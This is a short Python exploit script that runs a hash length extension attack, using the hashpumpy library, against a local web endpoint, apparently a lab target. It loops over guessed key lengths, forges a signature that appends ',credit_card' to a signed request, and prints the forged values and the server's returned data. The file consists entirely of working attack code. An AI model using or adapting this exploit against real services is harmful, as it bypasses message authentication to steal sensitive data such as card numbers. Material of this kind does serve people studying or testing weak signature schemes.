from hashlib import sha256
from hashpumpy import hashpump
import requests, base64, sys

data = {
	'data_to_show': 'username',
	'signature': 'sdfsafsadfas',
}
append_data = ',credit_card'

url = 'http://localhost:5000/get_user_data'

def make_request(data):
	if not isinstance(data['data_to_show'], bytes):
		data['data_to_show'] = data['data_to_show'].encode()

	data['data_to_show'] = base64.b64encode(data['data_to_show'])

	r = requests.post(url, data=data)

	server_data = r.json()

	return server_data


# server_data = make_request(data)

# print(server_data)

# sys.exit()


signature = '77c635a441ad291897ff1b10cd20f3537ad8458d38295344275a4fe81c398594'
# signature = '708cd0b85cf89c8790ce24390aa13755007215ce7317aaeef26fa8f85141386a'
# signature = '6d2b9a4ffe54879ab7807082d96afe1de794e4cd934ea14a26fee0adfb838548051d3aad34ee84ee1bab51dd1127f4d3d27d18f8f2fe1d8508e9bb3420afd8aa'
successfull = False

for i in range(100):
	new_signature, new_message = hashpump(signature, data['data_to_show'], append_data, i)

	_data = {
		'data_to_show': new_message,
		'signature': new_signature,
	}

	server_data = make_request(_data)

	if server_data.get('error', None) is None:
		successfull = True
		print('Key Length:', i)
		print('Fake Signature:', new_signature)
		print('Fake Message:', new_message)
		print('Server Data:', server_data)
		break


if not successfull:
	print('No vulnerable system.')